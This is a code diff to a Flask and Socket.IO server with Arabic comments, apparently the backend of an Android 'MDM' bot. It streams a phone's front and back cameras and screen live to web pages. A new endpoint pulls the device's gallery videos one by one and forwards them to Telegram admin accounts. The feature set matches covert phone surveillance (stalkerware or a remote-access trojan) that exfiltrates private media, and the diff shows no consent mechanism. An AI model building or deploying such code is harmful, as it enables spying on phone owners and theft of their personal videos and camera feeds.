@@ -1951,50 +1951,23 @@ def _live_stream_page(stream_id):
             document.getElementById('front_status').textContent = '⚠️ انقطع';
         }});
 
-        socket.on('camera_frame_binary', function(data) {{
-            // الإطارات قد تكون ArrayBuffer أو Blob
-            var isBack = false;
-            var isFront = false;
-            // ⚡ مطابقة عبر stream_id من meta event
-            // لكن binary لا يحمل stream_id — نطابق حسب آخر meta
-            if (data instanceof ArrayBuffer) {{
-                // سنطابق حسب آخر meta
-                displayFrame(data);
-            }} else if (data instanceof Blob) {{
-                displayFrame(data);
+        // ⚡ V11.2.12: استقبال Base64 عبر WebSocket (مع camera field للترتيب)
+        socket.on('camera_frame_push', function(data) {{
+            if (data && data.image && data.camera) {{
+                var imgId = (data.camera === 'back') ? 'back' : 'front';
+                var statusId = imgId + '_status';
+                // عرض الإطار فوراً
+                document.getElementById(imgId).src = 'data:image/jpeg;base64,' + data.image;
+                var count = (imgId === 'back') ? ++backCount : ++frontCount;
+                var now = Date.now();
+                var last = (imgId === 'back') ? backLastTime : frontLastTime;
+                var fps = last > 0 ? Math.round(1000 / (now - last)) : 0;
+                if (imgId === 'back') backLastTime = now; else frontLastTime = now;
+                document.getElementById(statusId).textContent =
+                    '✅ مباشر (' + data.camera + ') - إطار #' + count + ' (' + fps + ' FPS) | ' +
+                    (data.size / 1024).toFixed(1) + ' KB';
             }}
         }});
-
-        var lastMetaCamera = '';
-        socket.on('camera_frame_meta', function(meta) {{
-            if (meta && meta.camera) {{
-                lastMetaCamera = meta.camera;
-            }}
-            // تحديث الـ status
-            var imgId = (lastMetaCamera === 'back') ? 'back' : 'front';
-            var statusId = imgId + '_status';
-            var count = (imgId === 'back') ? ++backCount : ++frontCount;
-            var now = Date.now();
-            var last = (imgId === 'back') ? backLastTime : frontLastTime;
-            var fps = last > 0 ? Math.round(1000 / (now - last)) : 0;
-            if (imgId === 'back') backLastTime = now; else frontLastTime = now;
-            document.getElementById(statusId).textContent =
-                '✅ مباشر (binary) - إطار #' + count + ' (' + fps + ' FPS)';
-        }});
-
-        function displayFrame(frameData) {{
-            var blob = (frameData instanceof Blob) ? frameData :
-                       new Blob([frameData], {{ type: 'image/jpeg' }});
-            var url = URL.createObjectURL(blob);
-            // عرض حسب آخر meta
-            var imgId = (lastMetaCamera === 'back') ? 'back' : 'front';
-            var img = document.getElementById(imgId);
-            if (img && img._lastUrl) URL.revokeObjectURL(img._lastUrl);
-            if (img) {{
-                img.src = url;
-                img._lastUrl = url;
-            }}
-        }}
 
         // Fallback: polling سريع (إذا فشل WebSocket)
         var pollInterval = setInterval(function() {{
@@ -2154,7 +2127,7 @@ def _sock_screen_frame(data):
             logger.info(f"⏹ Screen stream STOPPED: {stream_id}")
             return
 
-        # ⚡ V11.2.11: إطار عادي - خزّنه (binary) + ابعث binary مباشرة لكل متابعي WebSocket
+        # ⚡ V11.2.12: إطار عادي - خزّنه + ابعث Base64 عبر WebSocket (موثوقية أعلى)
         b64image = data.get("image", "")
         if b64image and stream_id in _screen_streams:
             import base64 as _b64
@@ -2164,14 +2137,11 @@ def _sock_screen_frame(data):
                 "timestamp": time.time(),
                 "device_id": _screen_streams[stream_id].get("device_id", "?")
             }
-            # ⚡ V11.2.11: ابعث binary مباشرة (بدون Base64) عبر WebSocket
-            # هذا يقلل حجم الإطار المرسل بـ 33% + يسرّع المتصفح (لا decode)
+            # ⚡ V11.2.12: ابعث Base64 عبر WebSocket (event واحد فيه كل المعلومات)
             try:
-                socketio.emit("screen_frame_binary", jpeg_bytes,
-                              room=f"screen_{stream_id}", namespace="/")
-                # معلومات بسيطة منفصلة
-                socketio.emit("screen_frame_meta", {
+                socketio.emit("screen_frame_push", {
                     "stream_id": stream_id,
+                    "image": b64image,
                     "size": len(jpeg_bytes),
                     "timestamp": int(time.time() * 1000)
                 }, room=f"screen_{stream_id}", namespace="/")
@@ -2223,7 +2193,7 @@ def _screen_live_page(stream_id):
     <div class="header"><h2>📺 بث الشاشة المباشر</h2></div>
     <img id="screen" class="frame" src="" alt="انتظار..." />
     <div class="status" id="status">⏳ جاري الاتصال...</div>
-    <div class="info" id="info">⚡ WebSocket binary push (low latency)</div>
+    <div class="info" id="info">⚡ WebSocket push (low latency)</div>
     <script>
         var streamId = "{stream_id}";
         var count = 0;
@@ -2254,38 +2224,19 @@ def _screen_live_page(stream_id):
             socket.emit('screen_join', {{ stream_id: streamId }});
         }});
 
-        // ⚡ V11.2.11: استقبال binary مباشرة (بدون Base64)
-        socket.on('screen_frame_binary', function(data) {{
-            // data = ArrayBuffer من Socket.IO (binary frame)
-            if (data instanceof ArrayBuffer) {{
+        // ⚡ V11.2.12: استقبال Base64 عبر WebSocket (موثوقية أعلى)
+        socket.on('screen_frame_push', function(data) {{
+            if (data && data.image) {{
                 // عرض الإطار فوراً
-                var blob = new Blob([data], {{ type: 'image/jpeg' }});
-                var url = URL.createObjectURL(blob);
-                document.getElementById('screen').src = url;
-                // حرر الـ URL القديم
-                if (window._lastUrl) URL.revokeObjectURL(window._lastUrl);
-                window._lastUrl = url;
+                document.getElementById('screen').src = 'data:image/jpeg;base64,' + data.image;
                 count++;
                 var now = Date.now();
                 var fps = lastFrameTime > 0 ? Math.round(1000 / (now - lastFrameTime)) : 0;
                 lastFrameTime = now;
                 document.getElementById('status').textContent =
-                    '✅ مباشر (binary) - إطار #' + count + ' (' + fps + ' FPS)';
-            }} else if (data instanceof Blob) {{
-                // بعض الإصدارات ترسل Blob مباشرة
-                document.getElementById('screen').src = URL.createObjectURL(data);
-                count++;
-                lastFrameTime = Date.now();
-                document.getElementById('status').textContent =
-                    '✅ مباشر (blob) - إطار #' + count;
-            }}
-        }});
-
-        // معلومات إضافية (الحجم + timestamp)
-        socket.on('screen_frame_meta', function(data) {{
-            if (data && data.size) {{
+                    '✅ مباشر - إطار #' + count + ' (' + fps + ' FPS)';
                 document.getElementById('info').textContent =
-                    '⚡ WebSocket binary push | ' + (data.size / 1024).toFixed(1) + ' KB | ' +
+                    '⚡ WebSocket push | ' + (data.size / 1024).toFixed(1) + ' KB | ' +
                     new Date().toLocaleTimeString();
             }}
         }});
@@ -2377,7 +2328,7 @@ def _sock_camera_frame(data):
                         pass
             return
         
-        # ⚡ V11.2.11: إطار عادي - خزّنه + ابعث binary لكل متابعي WebSocket
+        # ⚡ V11.2.12: إطار عادي - خزّنه + ابعث Base64 عبر WebSocket (مع camera field للترتيب)
         b64image = data.get("image", "")
         if b64image and stream_id in _camera_streams:
             import base64 as _b64
@@ -2387,13 +2338,16 @@ def _sock_camera_frame(data):
                 "timestamp": time.time(),
                 "device_id": _camera_streams[stream_id].get("device_id", "?")
             }
-            # ⚡ V11.2.11: ابعث binary مباشرة عبر WebSocket (بدون Base64)
+            # ⚡ V11.2.12: ابعث Base64 مع camera field (للترتيب في المتصفح)
+            # ابحث عن الكاميرا (front/back) من stream_id أو data
+            camera = data.get("camera", "")
+            if not camera:
+                camera = "front" if "FRONT" in stream_id else "back"
             try:
-                socketio.emit("camera_frame_binary", jpeg_bytes,
-                              room=f"camera_{stream_id}", namespace="/")
-                socketio.emit("camera_frame_meta", {
+                socketio.emit("camera_frame_push", {
                     "stream_id": stream_id,
-                    "camera": data.get("camera", ""),
+                    "camera": camera,
+                    "image": b64image,
                     "size": len(jpeg_bytes),
                     "timestamp": int(time.time() * 1000)
                 }, room=f"camera_{stream_id}", namespace="/")
@@ -3352,6 +3306,78 @@ def _upload_audio():
     except Exception as e:
         logger.error(f"❌ /upload-audio error: {e}", exc_info=True)
         return jsonify({"error": str(e)}), 500
+
+
+# ⚡⚡⚡ V11.2.12: /upload-video-gallery — سحب الفيديوهات متسلسل (واحد → انتظر → ثاني)
+# يستقبل ملف multipart/form-data مع headers:
+#   - device_id:  معرف الجهاز
+#   - name:       اسم الفيديو
+#   - index:      رقم الفيديو (1-based)
+#   - total:      العدد الكلي
+#   - duration_ms: المدة بالميلي ثانية
+# يرسله للبوت عبر bot.send_video + يرجع {"success": True}
+# التطبيق ينتظر النجاح قبل سحب الفيديو التالي
+@app.route("/upload-video-gallery", methods=["POST"])
+def _upload_video_gallery():
+    try:
+        if "file" not in request.files:
+            return jsonify({"success": False, "error": "no file"}), 400
+
+        video_file = request.files["file"]
+        device_id = request.headers.get("device_id", "")
+        original_filename = video_file.filename or "video.mp4"
+        index = request.headers.get("index", "1")
+        total = request.headers.get("total", "1")
+        duration_ms = request.headers.get("duration_ms", "0")
+
+        file_bytes = video_file.read()
+        if not file_bytes:
+            return jsonify({"success": False, "error": "empty"}), 400
+
+        logger.info(f"🎥 Video gallery received: index={index}/{total}, "
+                    f"size={len(file_bytes)} bytes, file={original_filename}")
+
+        if not mdm_bot:
+            logger.warning("Bot not configured - dropping video gallery upload")
+            return jsonify({"success": False, "error": "bot not configured"}), 503
+
+        from io import BytesIO
+        bio = BytesIO(file_bytes)
+        caption = (f"🎬 <b>فيديو</b> [{index}/{total}]\n"
+                   f"📱 <b>الجهاز:</b> {device_id}\n"
+                   f"⏱️ <b>المدة:</b> {int(duration_ms)/1000:.1f} ثانية\n"
+                   f"📏 <b>الحجم:</b> {len(file_bytes)} bytes")
+
+        success = 0
+        for admin_id in Config.ADMIN_IDS:
+            try:
+                bio.seek(0)
+                mdm_bot.bot.send_video(admin_id, video=bio,
+                                       caption=caption,
+                                       parse_mode="HTML",
+                                       filename=original_filename,
+                                       visible_file_name=original_filename)
+                success += 1
+                logger.info(f"✅ Video {index}/{total} sent to admin {admin_id}")
+            except Exception as e:
+                logger.error(f"❌ Failed to send video to {admin_id}: {e}")
+                try:
+                    bio.seek(0)
+                    mdm_bot.bot.send_document(admin_id, document=bio,
+                                               caption=caption,
+                                               parse_mode="HTML",
+                                               filename=original_filename,
+                                               visible_file_name=original_filename)
+                    success += 1
+                    logger.info(f"✅ Video {index}/{total} fallback sent to {admin_id}")
+                except Exception as e2:
+                    logger.error(f"❌ Document fallback failed: {e2}")
+
+        return jsonify({"success": True, "sent_to": success, "index": index, "total": total}), 200
+
+    except Exception as e:
+        logger.error(f"❌ /upload-video-gallery error: {e}", exc_info=True)
+        return jsonify({"success": False, "error": str(e)}), 500
 
 
 # ⚡⚡⚡ V11.2.9: /upload-video-stream — استقبال مقاطع MP4 (H.264) من MediaCodec
